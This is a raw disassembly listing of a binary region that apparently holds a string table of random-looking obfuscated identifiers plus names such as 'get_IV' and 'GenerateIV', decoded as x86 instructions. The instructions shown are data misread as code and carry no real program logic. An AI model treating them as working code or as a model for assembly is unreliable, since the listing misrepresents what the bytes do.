  407b04:	64 69 4f 00 66 47 46 	imul   $0x7a464766,%fs:0x0(%edi),%ecx
  407b0b:	7a 
  407b0c:	77 46                	ja     0x407b54
  407b0e:	64 4e                	fs dec %esi
  407b10:	71 4c                	jno    0x407b5e
  407b12:	5a                   	pop    %edx
  407b13:	41                   	inc    %ecx
  407b14:	50                   	push   %eax
  407b15:	00 4c 4f 74          	add    %cl,0x74(%edi,%ecx,2)
  407b19:	45                   	inc    %ebp
  407b1a:	74 54                	je     0x407b70
  407b1c:	49                   	dec    %ecx
  407b1d:	49                   	dec    %ecx
  407b1e:	44                   	inc    %esp
  407b1f:	66 65 46             	gs inc %si
  407b22:	50                   	push   %eax
  407b23:	00 68 72             	add    %ch,0x72(%eax)
  407b26:	5a                   	pop    %edx
  407b27:	48                   	dec    %eax
  407b28:	4a                   	dec    %edx
  407b29:	77 77                	ja     0x407ba2
  407b2b:	55                   	push   %ebp
  407b2c:	69 48 48 4f 50 00 43 	imul   $0x4300504f,0x48(%eax),%ecx
  407b33:	62 64 67 52          	bound  %esp,0x52(%edi,%eiz,2)
  407b37:	68 50 6f 55 51       	push   $0x51556f50
  407b3c:	70 50                	jo     0x407b8e
  407b3e:	00 41 73             	add    %al,0x73(%ecx)
  407b41:	63 75 4c             	arpl   %esi,0x4c(%ebp)
  407b44:	77 47                	ja     0x407b8d
  407b46:	54                   	push   %esp
  407b47:	52                   	push   %edx
  407b48:	70 6c                	jo     0x407bb6
  407b4a:	74 50                	je     0x407b9c
  407b4c:	00 73 50             	add    %dh,0x50(%ebx)
  407b4f:	59                   	pop    %ecx
  407b50:	43                   	inc    %ebx
  407b51:	6c                   	insb   (%dx),%es:(%edi)
  407b52:	49                   	dec    %ecx
  407b53:	54                   	push   %esp
  407b54:	71 71                	jno    0x407bc7
  407b56:	71 74                	jno    0x407bcc
  407b58:	50                   	push   %eax
  407b59:	00 78 61             	add    %bh,0x61(%eax)
  407b5c:	4a                   	dec    %edx
  407b5d:	6b 56 4d 4e          	imul   $0x4e,0x4d(%esi),%edx
  407b61:	67 58                	addr16 pop %eax
  407b63:	59                   	pop    %ecx
  407b64:	4a                   	dec    %edx
  407b65:	51                   	push   %ecx
  407b66:	00 59 71             	add    %bl,0x71(%ecx)
  407b69:	77 77                	ja     0x407be2
  407b6b:	71 53                	jno    0x407bc0
  407b6d:	57                   	push   %edi
  407b6e:	49                   	dec    %ecx
  407b6f:	44                   	inc    %esp
  407b70:	69 45 7a 4c 51 00 63 	imul   $0x6300514c,0x7a(%ebp),%eax
  407b77:	6e                   	outsb  %ds:(%esi),(%dx)
  407b78:	4e                   	dec    %esi
  407b79:	45                   	inc    %ebp
  407b7a:	57                   	push   %edi
  407b7b:	6b 79 51 45          	imul   $0x45,0x51(%ecx),%edi
  407b7f:	50                   	push   %eax
  407b80:	51                   	push   %ecx
  407b81:	00 79 51             	add    %bh,0x51(%ecx)
  407b84:	66 6d                	insw   (%dx),%es:(%edi)
  407b86:	75 4c                	jne    0x407bd4
  407b88:	63 58 52             	arpl   %ebx,0x52(%eax)
  407b8b:	50                   	push   %eax
  407b8c:	6b 77 4d 69          	imul   $0x69,0x4d(%edi),%esi
  407b90:	51                   	push   %ecx
  407b91:	51                   	push   %ecx
  407b92:	00 6a 55             	add    %ch,0x55(%edx)
  407b95:	79 42                	jns    0x407bd9
  407b97:	4d                   	dec    %ebp
  407b98:	64 62 76 52          	bound  %esi,%fs:0x52(%esi)
  407b9c:	59                   	pop    %ecx
  407b9d:	51                   	push   %ecx
  407b9e:	00 44 52 6e          	add    %al,0x6e(%edx,%edx,2)
  407ba2:	42                   	inc    %edx
  407ba3:	75 51                	jne    0x407bf6
  407ba5:	45                   	inc    %ebp
  407ba6:	54                   	push   %esp
  407ba7:	76 65                	jbe    0x407c0e
  407ba9:	63 5a 51             	arpl   %ebx,0x51(%edx)
  407bac:	00 72 57             	add    %dh,0x57(%edx)
  407baf:	74 48                	je     0x407bf9
  407bb1:	6f                   	outsl  %ds:(%esi),(%dx)
  407bb2:	71 58                	jno    0x407c0c
  407bb4:	46                   	inc    %esi
  407bb5:	52                   	push   %edx
  407bb6:	76 4b                	jbe    0x407c03
  407bb8:	72 5a                	jb     0x407c14
  407bba:	51                   	push   %ecx
  407bbb:	00 76 69             	add    %dh,0x69(%esi)
  407bbe:	50                   	push   %eax
  407bbf:	72 6f                	jb     0x407c30
  407bc1:	68 73 64 7a 77       	push   $0x777a6473
  407bc6:	52                   	push   %edx
  407bc7:	67 51                	addr16 push %ecx
  407bc9:	00 6a 6a             	add    %ch,0x6a(%edx)
  407bcc:	58                   	pop    %eax
  407bcd:	66 4c                	dec    %sp
  407bcf:	47                   	inc    %edi
  407bd0:	45                   	inc    %ebp
  407bd1:	4f                   	dec    %edi
  407bd2:	53                   	push   %ebx
  407bd3:	76 77                	jbe    0x407c4c
  407bd5:	67 51                	addr16 push %ecx
  407bd7:	00 53 61             	add    %dl,0x61(%ebx)
  407bda:	54                   	push   %esp
  407bdb:	6d                   	insl   (%dx),%es:(%edi)
  407bdc:	47                   	inc    %edi
  407bdd:	49                   	dec    %ecx
  407bde:	74 62                	je     0x407c42
  407be0:	6d                   	insl   (%dx),%es:(%edi)
  407be1:	52                   	push   %edx
  407be2:	61                   	popa
  407be3:	55                   	push   %ebp
  407be4:	77 51                	ja     0x407c37
  407be6:	00 49 4d             	add    %cl,0x4d(%ecx)
  407be9:	4f                   	dec    %edi
  407bea:	76 58                	jbe    0x407c44
  407bec:	75 42                	jne    0x407c30
  407bee:	4b                   	dec    %ebx
  407bef:	41                   	inc    %ecx
  407bf0:	52                   	push   %edx
  407bf1:	00 73 6e             	add    %dh,0x6e(%ebx)
  407bf4:	43                   	inc    %ebx
  407bf5:	64 45                	fs inc %ebp
  407bf7:	4e                   	dec    %esi
  407bf8:	76 73                	jbe    0x407c6d
  407bfa:	43                   	inc    %ebx
  407bfb:	52                   	push   %edx
  407bfc:	00 4f 59             	add    %cl,0x59(%edi)
  407bff:	59                   	pop    %ecx
  407c00:	4b                   	dec    %ebx
  407c01:	66 42                	inc    %dx
  407c03:	42                   	inc    %edx
  407c04:	4f                   	dec    %edi
  407c05:	72 4f                	jb     0x407c56
  407c07:	52                   	push   %edx
  407c08:	00 42 6a             	add    %al,0x6a(%edx)
  407c0b:	6d                   	insl   (%dx),%es:(%edi)
  407c0c:	70 75                	jo     0x407c83
  407c0e:	62 43 51             	bound  %eax,0x51(%ebx)
  407c11:	74 49                	je     0x407c5c
  407c13:	55                   	push   %ebp
  407c14:	64 52                	fs push %edx
  407c16:	00 69 6a             	add    %ch,0x6a(%ecx)
  407c19:	6a 56                	push   $0x56
  407c1b:	43                   	inc    %ebx
  407c1c:	72 70                	jb     0x407c8e
  407c1e:	66 74 64             	data16 je 0x407c85
  407c21:	52                   	push   %edx
  407c22:	00 75 55             	add    %dh,0x55(%ebp)
  407c25:	50                   	push   %eax
  407c26:	6f                   	outsl  %ds:(%esi),(%dx)
  407c27:	78 75                	js     0x407c9e
  407c29:	4a                   	dec    %edx
  407c2a:	51                   	push   %ecx
  407c2b:	78 67                	js     0x407c94
  407c2d:	52                   	push   %edx
  407c2e:	00 6b 42             	add    %ch,0x42(%ebx)
  407c31:	44                   	inc    %esp
  407c32:	57                   	push   %edi
  407c33:	64 75 56             	fs jne 0x407c8c
  407c36:	63 49 43             	arpl   %ecx,0x43(%ecx)
  407c39:	53                   	push   %ebx
  407c3a:	00 5a 52             	add    %bl,0x52(%edx)
  407c3d:	6c                   	insb   (%dx),%es:(%edi)
  407c3e:	67 48                	addr16 dec %eax
  407c40:	43                   	inc    %ebx
  407c41:	41                   	inc    %ecx
  407c42:	6a 41                	push   $0x41
  407c44:	49                   	dec    %ecx
  407c45:	51                   	push   %ecx
  407c46:	68 71 46 53 00       	push   $0x534671
  407c4b:	48                   	dec    %eax
  407c4c:	4f                   	dec    %edi
  407c4d:	74 65                	je     0x407cb4
  407c4f:	7a 6d                	jp     0x407cbe
  407c51:	42                   	inc    %edx
  407c52:	70 74                	jo     0x407cc8
  407c54:	4b                   	dec    %ebx
  407c55:	53                   	push   %ebx
  407c56:	00 4c 5a 59          	add    %cl,0x59(%edx,%ebx,2)
  407c5a:	67 50                	addr16 push %eax
  407c5c:	6f                   	outsl  %ds:(%esi),(%dx)
  407c5d:	4f                   	dec    %edi
  407c5e:	75 73                	jne    0x407cd3
  407c60:	52                   	push   %edx
  407c61:	70 6c                	jo     0x407ccf
  407c63:	52                   	push   %edx
  407c64:	53                   	push   %ebx
  407c65:	00 79 73             	add    %bh,0x73(%ecx)
  407c68:	45                   	inc    %ebp
  407c69:	5a                   	pop    %edx
  407c6a:	6d                   	insl   (%dx),%es:(%edi)
  407c6b:	43                   	inc    %ebx
  407c6c:	47                   	inc    %edi
  407c6d:	47                   	inc    %edi
  407c6e:	76 53                	jbe    0x407cc3
  407c70:	53                   	push   %ebx
  407c71:	00 50 75             	add    %dl,0x75(%eax)
  407c74:	53                   	push   %ebx
  407c75:	42                   	inc    %edx
  407c76:	70 4e                	jo     0x407cc6
  407c78:	79 58                	jns    0x407cd2
  407c7a:	5a                   	pop    %edx
  407c7b:	49                   	dec    %ecx
  407c7c:	76 74                	jbe    0x407cf2
  407c7e:	6d                   	insl   (%dx),%es:(%edi)
  407c7f:	53                   	push   %ebx
  407c80:	00 70 4c             	add    %dh,0x4c(%eax)
  407c83:	75 41                	jne    0x407cc6
  407c85:	75 4b                	jne    0x407cd2
  407c87:	4d                   	dec    %ebp
  407c88:	7a 53                	jp     0x407cdd
  407c8a:	50                   	push   %eax
  407c8b:	77 79                	ja     0x407d06
  407c8d:	43                   	inc    %ebx
  407c8e:	66 6e                	data16 outsb %ds:(%esi),(%dx)
  407c90:	53                   	push   %ebx
  407c91:	00 51 43             	add    %dl,0x43(%ecx)
  407c94:	57                   	push   %edi
  407c95:	6d                   	insl   (%dx),%es:(%edi)
  407c96:	50                   	push   %eax
  407c97:	58                   	pop    %eax
  407c98:	68 6e 71 62 72       	push   $0x7262716e
  407c9d:	53                   	push   %ebx
  407c9e:	00 47 64             	add    %al,0x64(%edi)
  407ca1:	6e                   	outsb  %ds:(%esi),(%dx)
  407ca2:	51                   	push   %ecx
  407ca3:	5a                   	pop    %edx
  407ca4:	66 54                	push   %sp
  407ca6:	64 6b 49 5a 6a       	imul   $0x6a,%fs:0x5a(%ecx),%ecx
  407cab:	52                   	push   %edx
  407cac:	56                   	push   %esi
  407cad:	79 53                	jns    0x407d02
  407caf:	00 44 6e 75          	add    %al,0x75(%esi,%ebp,2)
  407cb3:	6e                   	outsb  %ds:(%esi),(%dx)
  407cb4:	43                   	inc    %ebx
  407cb5:	59                   	pop    %ecx
  407cb6:	53                   	push   %ebx
  407cb7:	4b                   	dec    %ebx
  407cb8:	69 67 43 54 00 53 54 	imul   $0x54530054,0x43(%edi),%esp
  407cbf:	67 6f                	outsl  %ds:(%si),(%dx)
  407cc1:	43                   	inc    %ebx
  407cc2:	7a 51                	jp     0x407d15
  407cc4:	65 57                	gs push %edi
  407cc6:	4e                   	dec    %esi
  407cc7:	6a 77                	push   $0x77
  407cc9:	73 52                	jae    0x407d1d
  407ccb:	54                   	push   %esp
  407ccc:	00 54 54 4d          	add    %dl,0x4d(%esp,%edx,2)
  407cd0:	50                   	push   %eax
  407cd1:	47                   	inc    %edi
  407cd2:	57                   	push   %edi
  407cd3:	58                   	pop    %eax
  407cd4:	4f                   	dec    %edi
  407cd5:	61                   	popa
  407cd6:	5a                   	pop    %edx
  407cd7:	54                   	push   %esp
  407cd8:	00 77 6f             	add    %dh,0x6f(%edi)
  407cdb:	4a                   	dec    %edx
  407cdc:	50                   	push   %eax
  407cdd:	43                   	inc    %ebx
  407cde:	56                   	push   %esi
  407cdf:	44                   	inc    %esp
  407ce0:	75 4a                	jne    0x407d2c
  407ce2:	70 6e                	jo     0x407d52
  407ce4:	5a                   	pop    %edx
  407ce5:	6e                   	outsb  %ds:(%esi),(%dx)
  407ce6:	67 54                	addr16 push %esp
  407ce8:	00 44 4f 77          	add    %al,0x77(%edi,%ecx,2)
  407cec:	6a 6d                	push   $0x6d
  407cee:	54                   	push   %esp
  407cef:	73 75                	jae    0x407d66
  407cf1:	42                   	inc    %edx
  407cf2:	68 69 6e 54 00       	push   $0x546e69
  407cf7:	6c                   	insb   (%dx),%es:(%edi)
  407cf8:	73 72                	jae    0x407d6c
  407cfa:	74 65                	je     0x407d61
  407cfc:	70 6b                	jo     0x407d69
  407cfe:	6b 74 54 00 41       	imul   $0x41,0x0(%esp,%edx,2),%esi
  407d03:	57                   	push   %edi
  407d04:	71 62                	jno    0x407d68
  407d06:	65 5a                	gs pop %edx
  407d08:	6d                   	insl   (%dx),%es:(%edi)
  407d09:	71 6f                	jno    0x407d7a
  407d0b:	6e                   	outsb  %ds:(%esi),(%dx)
  407d0c:	75 67                	jne    0x407d75
  407d0e:	41                   	inc    %ecx
  407d0f:	55                   	push   %ebp
  407d10:	00 4e 71             	add    %cl,0x71(%esi)
  407d13:	57                   	push   %edi
  407d14:	49                   	dec    %ecx
  407d15:	4f                   	dec    %edi
  407d16:	47                   	inc    %edi
  407d17:	4a                   	dec    %edx
  407d18:	54                   	push   %esp
  407d19:	53                   	push   %ebx
  407d1a:	4a                   	dec    %edx
  407d1b:	55                   	push   %ebp
  407d1c:	00 79 4e             	add    %bh,0x4e(%ecx)
  407d1f:	5a                   	pop    %edx
  407d20:	7a 72                	jp     0x407d94
  407d22:	42                   	inc    %edx
  407d23:	66 65 53             	gs push %bx
  407d26:	4a                   	dec    %edx
  407d27:	55                   	push   %ebp
  407d28:	00 56 6c             	add    %dl,0x6c(%esi)
  407d2b:	6a 52                	push   $0x52
  407d2d:	52                   	push   %edx
  407d2e:	61                   	popa
  407d2f:	61                   	popa
  407d30:	4e                   	dec    %esi
  407d31:	48                   	dec    %eax
  407d32:	55                   	push   %ebp
  407d33:	55                   	push   %ebp
  407d34:	00 45 62             	add    %al,0x62(%ebp)
  407d37:	4f                   	dec    %edi
  407d38:	76 73                	jbe    0x407dad
  407d3a:	66 56                	push   %si
  407d3c:	51                   	push   %ecx
  407d3d:	4c                   	dec    %esp
  407d3e:	58                   	pop    %eax
  407d3f:	55                   	push   %ebp
  407d40:	00 63 4a             	add    %ah,0x4a(%ebx)
  407d43:	48                   	dec    %eax
  407d44:	4b                   	dec    %ebx
  407d45:	6b 70 4f 65          	imul   $0x65,0x4f(%eax),%esi
  407d49:	47                   	inc    %edi
  407d4a:	64 58                	fs pop %eax
  407d4c:	64 55                	fs push %ebp
  407d4e:	00 4b 4a             	add    %cl,0x4a(%ebx)
  407d51:	6b 65 4c 48          	imul   $0x48,0x4c(%ebp),%esp
  407d55:	5a                   	pop    %edx
  407d56:	76 4c                	jbe    0x407da4
  407d58:	73 76                	jae    0x407dd0
  407d5a:	55                   	push   %ebp
  407d5b:	00 67 65             	add    %ah,0x65(%edi)
  407d5e:	74 5f                	je     0x407dbf
  407d60:	49                   	dec    %ecx
  407d61:	56                   	push   %esi
  407d62:	00 73 65             	add    %dh,0x65(%ebx)
  407d65:	74 5f                	je     0x407dc6
  407d67:	49                   	dec    %ecx
  407d68:	56                   	push   %esi
  407d69:	00 47 65             	add    %al,0x65(%edi)
  407d6c:	6e                   	outsb  %ds:(%esi),(%dx)
  407d6d:	65 72 61             	gs jb  0x407dd1
  407d70:	74 65                	je     0x407dd7
  407d72:	49                   	dec    %ecx
  407d73:	56                   	push   %esi
  407d74:	00 45 70             	add    %al,0x70(%ebp)
  407d77:	64 4c                	fs dec %esp
  407d79:	6f                   	outsl  %ds:(%esi),(%dx)
  407d7a:	49                   	dec    %ecx
  407d7b:	73 48                	jae    0x407dc5
  407d7d:	4b                   	dec    %ebx
  407d7e:	5a                   	pop    %edx
  407d7f:	78 6c                	js     0x407ded
  407d81:	56                   	push   %esi
  407d82:	56                   	push   %esi
  407d83:	00 44 4e 55          	add    %al,0x55(%esi,%ecx,2)
  407d87:	57                   	push   %edi
  407d88:	55                   	push   %ebp
  407d89:	47                   	inc    %edi
  407d8a:	61                   	popa
  407d8b:	42                   	inc    %edx
  407d8c:	61                   	popa
  407d8d:	43                   	inc    %ebx
  407d8e:	68 71 55 5a 56       	push   $0x565a5571
  407d93:	00 58 47             	add    %bl,0x47(%eax)
  407d96:	54                   	push   %esp
  407d97:	68 73 66 74 4b       	push   $0x4b746673
  407d9c:	6b 6d 56 00          	imul   $0x0,0x56(%ebp),%ebp
  407da0:	4b                   	dec    %ebx
  407da1:	69 45 46 6d 67 71 71 	imul   $0x7171676d,0x46(%ebp),%eax
  407da8:	75 56                	jne    0x407e00
  407daa:	00 47 44             	add    %al,0x44(%edi)
  407dad:	62 6f 7a             	bound  %ebp,0x7a(%edi)
  407db0:	44                   	inc    %esp
  407db1:	67 77 5a             	addr16 ja 0x407e0e
  407db4:	61                   	popa
  407db5:	68 51 77 56 00       	push   $0x567751
  407dba:	77 6a                	ja     0x407e26
  407dbc:	4a                   	dec    %edx
  407dbd:	6e                   	outsb  %ds:(%esi),(%dx)
  407dbe:	73 4a                	jae    0x407e0a
  407dc0:	4a                   	dec    %edx
  407dc1:	6f                   	outsl  %ds:(%esi),(%dx)
  407dc2:	6c                   	insb   (%dx),%es:(%edi)
  407dc3:	4a                   	dec    %edx
  407dc4:	44                   	inc    %esp
  407dc5:	57                   	push   %edi
  407dc6:	00 57 67             	add    %dl,0x67(%edi)
  407dc9:	7a 71                	jp     0x407e3c
  407dcb:	64 4f                	fs dec %edi
  407dcd:	76 4b                	jbe    0x407e1a
  407dcf:	51                   	push   %ecx
  407dd0:	6a 51                	push   $0x51
  407dd2:	4b                   	dec    %ebx
  407dd3:	57                   	push   %edi
  407dd4:	00 72 4b             	add    %dh,0x4b(%edx)
  407dd7:	77 6b                	ja     0x407e44
  407dd9:	4e                   	dec    %esi
  407dda:	4c                   	dec    %esp
  407ddb:	79 66                	jns    0x407e43
  407ddd:	55                   	push   %ebp
  407dde:	70 57                	jo     0x407e37
  407de0:	50                   	push   %eax
  407de1:	57                   	push   %edi
  407de2:	00 4b 4a             	add    %cl,0x4a(%ebx)
  407de5:	70 71                	jo     0x407e58
  407de7:	4f                   	dec    %edi
  407de8:	76 4e                	jbe    0x407e38
  407dea:	7a 6c                	jp     0x407e58
  407dec:	59                   	pop    %ecx
  407ded:	57                   	push   %edi
  407dee:	00 78 4d             	add    %bh,0x4d(%eax)
  407df1:	67 74 71             	addr16 je 0x407e65
  407df4:	58                   	pop    %eax
  407df5:	43                   	inc    %ebx
  407df6:	6e                   	outsb  %ds:(%esi),(%dx)
  407df7:	54                   	push   %esp
  407df8:	66 5a                	pop    %dx
  407dfa:	57                   	push   %edi
  407dfb:	00 78 78             	add    %bh,0x78(%eax)
  407dfe:	41                   	inc    %ecx
  407dff:	4e                   	dec    %esi
  407e00:	49                   	dec    %ecx
  407e01:	68 6f 67 4b 70       	push   $0x704b676f
  407e06:	62 57 00             	bound  %edx,0x0(%edi)
  407e09:	73 62                	jae    0x407e6d
  407e0b:	63 53 79             	arpl   %edx,0x79(%ebx)
  407e0e:	42                   	inc    %edx
  407e0f:	77 74                	ja     0x407e85
  407e11:	56                   	push   %esi
  407e12:	6c                   	insb   (%dx),%es:(%edi)
  407e13:	71 4d                	jno    0x407e62
  407e15:	78 47                	js     0x407e5e
  407e17:	76 62                	jbe    0x407e7b
  407e19:	57                   	push   %edi
  407e1a:	00 5a 71             	add    %bl,0x71(%edx)
  407e1d:	59                   	pop    %ecx
  407e1e:	68 49 41 6f 62       	push   $0x626f4149
  407e23:	4b                   	dec    %ebx
  407e24:	70 53                	jo     0x407e79
  407e26:	6d                   	insl   (%dx),%es:(%edi)
  407e27:	57                   	push   %edi
  407e28:	00 50 69             	add    %dl,0x69(%eax)
  407e2b:	59                   	pop    %ecx
  407e2c:	4e                   	dec    %esi
  407e2d:	45                   	inc    %ebp
  407e2e:	4a                   	dec    %edx
  407e2f:	67 69 41 58 00 6c 4d 	imul   $0x484d6c00,0x58(%bx,%di),%eax
  407e36:	48 
  407e37:	49                   	dec    %ecx
  407e38:	72 62                	jb     0x407e9c
  407e3a:	6a 6e                	push   $0x6e
  407e3c:	42                   	inc    %edx
  407e3d:	58                   	pop    %eax
  407e3e:	00 50 6a             	add    %dl,0x6a(%eax)
  407e41:	4c                   	dec    %esp
  407e42:	6f                   	outsl  %ds:(%esi),(%dx)
  407e43:	42                   	inc    %edx
  407e44:	4c                   	dec    %esp
  407e45:	67 50                	addr16 push %eax
  407e47:	41                   	inc    %ecx
  407e48:	4f                   	dec    %edi
  407e49:	55                   	push   %ebp
  407e4a:	47                   	inc    %edi
  407e4b:	58                   	pop    %eax
  407e4c:	00 4f 66             	add    %cl,0x66(%edi)
  407e4f:	72 49                	jb     0x407e9a
  407e51:	46                   	inc    %esi
  407e52:	77 4b                	ja     0x407e9f
  407e54:	72 4e                	jb     0x407ea4
  407e56:	73 48                	jae    0x407ea0
  407e58:	58                   	pop    %eax
  407e59:	00 44 6d 76          	add    %al,0x76(%ebp,%ebp,2)
  407e5d:	4e                   	dec    %esi
  407e5e:	64 74 54             	fs je  0x407eb5
  407e61:	62 4f 45             	bound  %ecx,0x45(%edi)
  407e64:	70 62                	jo     0x407ec8
  407e66:	64 4a                	fs dec %edx
  407e68:	58                   	pop    %eax
  407e69:	00 42 50             	add    %al,0x50(%edx)
  407e6c:	59                   	pop    %ecx
  407e6d:	59                   	pop    %ecx
  407e6e:	76 44                	jbe    0x407eb4
  407e70:	6a 64                	push   $0x64
  407e72:	67 58                	addr16 pop %eax
  407e74:	00 47 6d             	add    %al,0x6d(%edi)
  407e77:	51                   	push   %ecx
  407e78:	54                   	push   %esp
  407e79:	57                   	push   %edi
  407e7a:	45                   	inc    %ebp
  407e7b:	6f                   	outsl  %ds:(%esi),(%dx)
  407e7c:	64 6b 7a 70 58       	imul   $0x58,%fs:0x70(%edx),%edi
  407e81:	00 66 74             	add    %ah,0x74(%esi)
  407e84:	6d                   	insl   (%dx),%es:(%edi)
  407e85:	68 65 5a 4d 58       	push   $0x584d5a65
  407e8a:	7a 54                	jp     0x407ee0
  407e8c:	4a                   	dec    %edx
  407e8d:	74 58                	je     0x407ee7
  407e8f:	00 67 6b             	add    %ah,0x6b(%edi)
  407e92:	52                   	push   %edx
  407e93:	48                   	dec    %eax
  407e94:	57                   	push   %edi
  407e95:	6f                   	outsl  %ds:(%esi),(%dx)
  407e96:	61                   	popa
  407e97:	7a 6d                	jp     0x407f06
  407e99:	77 58                	ja     0x407ef3
  407e9b:	00 63 4b             	add    %ah,0x4b(%ebx)
  407e9e:	73 62                	jae    0x407f02
  407ea0:	44                   	inc    %esp
  407ea1:	49                   	dec    %ecx
  407ea2:	66 79 76             	data16 jns 0x407f1b
  407ea5:	4f                   	dec    %edi
  407ea6:	78 77                	js     0x407f1f
  407ea8:	58                   	pop    %eax
  407ea9:	00 7a 54             	add    %bh,0x54(%edx)
  407eac:	63 65 74             	arpl   %esp,0x74(%ebp)
  407eaf:	50                   	push   %eax
  407eb0:	73 4f                	jae    0x407f01
  407eb2:	56                   	push   %esi
  407eb3:	53                   	push   %ebx
  407eb4:	44                   	inc    %esp
  407eb5:	59                   	pop    %ecx
  407eb6:	00 4e 55             	add    %cl,0x55(%esi)
  407eb9:	77 49                	ja     0x407f04
  407ebb:	4f                   	dec    %edi
  407ebc:	50                   	push   %eax
  407ebd:	6b 65 68 4e          	imul   $0x4e,0x68(%ebp),%esp
  407ec1:	59                   	pop    %ecx
  407ec2:	00 5a 61             	add    %bl,0x61(%edx)
  407ec5:	73 6d                	jae    0x407f34
  407ec7:	73 4a                	jae    0x407f13
  407ec9:	43                   	inc    %ebx
  407eca:	73 78                	jae    0x407f44
  407ecc:	4b                   	dec    %ebx
  407ecd:	44                   	inc    %esp
  407ece:	64 59                	fs pop %ecx
  407ed0:	00 53 41             	add    %dl,0x41(%ebx)
  407ed3:	43                   	inc    %ebx
  407ed4:	61                   	popa
  407ed5:	6a 66                	push   $0x66
  407ed7:	76 44                	jbe    0x407f1d
  407ed9:	69 64 68 59 00 68 59 	imul   $0x7a596800,0x59(%eax,%ebp,2),%esp
  407ee0:	7a 
  407ee1:	61                   	popa
  407ee2:	53                   	push   %ebx
  407ee3:	57                   	push   %edi
  407ee4:	49                   	dec    %ecx
  407ee5:	6b 4e 4e 4c          	imul   $0x4c,0x4e(%esi),%ecx
  407ee9:	6e                   	outsb  %ds:(%esi),(%dx)
  407eea:	59                   	pop    %ecx
  407eeb:	00 47 44             	add    %al,0x44(%edi)
  407eee:	79 49                	jns    0x407f39
  407ef0:	47                   	inc    %edi
  407ef1:	51                   	push   %ecx
  407ef2:	63 61 56             	arpl   %esp,0x56(%ecx)
  407ef5:	65 71 59             	gs jno 0x407f51
  407ef8:	00 57 6f             	add    %dl,0x6f(%edi)
  407efb:	79 4d                	jns    0x407f4a
  407efd:	73 50                	jae    0x407f4f
  407eff:	41                   	inc    %ecx
  407f00:	73 45                	jae    0x407f47
  407f02:	4a                   	dec    %edx
  407f03:	71 48                	jno    0x407f4d
  407f05:	49                   	dec    %ecx
  407f06:	5a                   	pop    %edx
  407f07:	00 50 6f             	add    %dl,0x6f(%eax)
  407f0a:	43                   	inc    %ebx
  407f0b:	70 55                	jo     0x407f62
  407f0d:	65 71 54             	gs jno 0x407f64
  407f10:	4f                   	dec    %edi
  407f11:	75 49                	jne    0x407f5c
  407f13:	5a                   	pop    %edx
  407f14:	00 42 51             	add    %al,0x51(%edx)
  407f17:	6f                   	outsl  %ds:(%esi),(%dx)
  407f18:	44                   	inc    %esp
  407f19:	72 6c                	jb     0x407f87
  407f1b:	6c                   	insb   (%dx),%es:(%edi)
  407f1c:	51                   	push   %ecx
  407f1d:	72 6c                	jb     0x407f8b
  407f1f:	4b                   	dec    %ebx
  407f20:	5a                   	pop    %edx
  407f21:	00 53 7a             	add    %dl,0x7a(%ebx)
  407f24:	7a 4b                	jp     0x407f71
  407f26:	59                   	pop    %ecx
  407f27:	49                   	dec    %ecx
  407f28:	79 42                	jns    0x407f6c
  407f2a:	51                   	push   %ecx
  407f2b:	75 57                	jne    0x407f84
  407f2d:	42                   	inc    %edx
  407f2e:	44                   	inc    %esp
  407f2f:	69 5a 00 4b 74 49 6e 	imul   $0x6e49744b,0x0(%edx),%ebx
  407f36:	51                   	push   %ecx
  407f37:	4b                   	dec    %ebx
  407f38:	56                   	push   %esi
  407f39:	61                   	popa
  407f3a:	67 78 5a             	addr16 js 0x407f97
  407f3d:	00 76 61             	add    %dh,0x61(%esi)
  407f40:	6c                   	insb   (%dx),%es:(%edi)
  407f41:	75 65                	jne    0x407fa8
  407f43:	5f                   	pop    %edi
  407f44:	5f                   	pop    %edi
  407f45:	00 51 68             	add    %dl,0x68(%ecx)
  407f48:	45                   	inc    %ebp
  407f49:	45                   	inc    %ebp
  407f4a:	74 55                	je     0x407fa1
  407f4c:	51                   	push   %ecx
  407f4d:	49                   	dec    %ecx
  407f4e:	6e                   	outsb  %ds:(%esi),(%dx)
  407f4f:	41                   	inc    %ecx
  407f50:	5a                   	pop    %edx
  407f51:	51                   	push   %ecx
  407f52:	44                   	inc    %esp
  407f53:	61                   	popa
  407f54:	00 47 4d             	add    %al,0x4d(%edi)
  407f57:	63 6e 6d             	arpl   %ebp,0x6d(%esi)
  407f5a:	4f                   	dec    %edi
  407f5b:	4b                   	dec    %ebx
  407f5c:	5a                   	pop    %edx
  407f5d:	56                   	push   %esi
  407f5e:	61                   	popa
  407f5f:	4e                   	dec    %esi
  407f60:	61                   	popa
  407f61:	00 4f 78             	add    %cl,0x78(%edi)
  407f64:	48                   	dec    %eax
  407f65:	47                   	inc    %edi
  407f66:	71 62                	jno    0x407fca
  407f68:	7a 59                	jp     0x407fc3
  407f6a:	77 41                	ja     0x407fad
  407f6c:	46                   	inc    %esi
  407f6d:	57                   	push   %edi
  407f6e:	61                   	popa
  407f6f:	00 4a 76             	add    %cl,0x76(%edx)
  407f72:	49                   	dec    %ecx
  407f73:	70 55                	jo     0x407fca
  407f75:	54                   	push   %esp
  407f76:	71 61                	jno    0x407fd9
  407f78:	75 42                	jne    0x407fbc
  407f7a:	63 61 00             	arpl   %esp,0x0(%ecx)
  407f7d:	46                   	inc    %esi
  407f7e:	49                   	dec    %ecx
  407f7f:	68 69 49 45 45       	push   $0x45454969
  407f84:	67 56                	addr16 push %esi
  407f86:	55                   	push   %ebp
  407f87:	70 64                	jo     0x407fed
  407f89:	61                   	popa
  407f8a:	00 6f 6e             	add    %ch,0x6e(%edi)
  407f8d:	58                   	pop    %eax
  407f8e:	4a                   	dec    %edx
  407f8f:	6c                   	insb   (%dx),%es:(%edi)
  407f90:	59                   	pop    %ecx
  407f91:	4d                   	dec    %ebp
  407f92:	43                   	inc    %ebx
  407f93:	6a 61                	push   $0x61
  407f95:	00 73 56             	add    %dh,0x56(%ebx)
  407f98:	55                   	push   %ebp
  407f99:	46                   	inc    %esi
  407f9a:	76 59                	jbe    0x407ff5
  407f9c:	46                   	inc    %esi
  407f9d:	55                   	push   %ebp
  407f9e:	6d                   	insl   (%dx),%es:(%edi)
  407f9f:	77 76                	ja     0x408017
  407fa1:	4e                   	dec    %esi
  407fa2:	70 61                	jo     0x408005
  407fa4:	00 48 48             	add    %cl,0x48(%eax)
  407fa7:	47                   	inc    %edi
  407fa8:	54                   	push   %esp
  407fa9:	68 75 4b 65 56       	push   $0x56654b75
  407fae:	78 61                	js     0x408011
  407fb0:	00 6d 73             	add    %ch,0x73(%ebp)
  407fb3:	63 6f 72             	arpl   %ebp,0x72(%edi)
  407fb6:	6c                   	insb   (%dx),%es:(%edi)
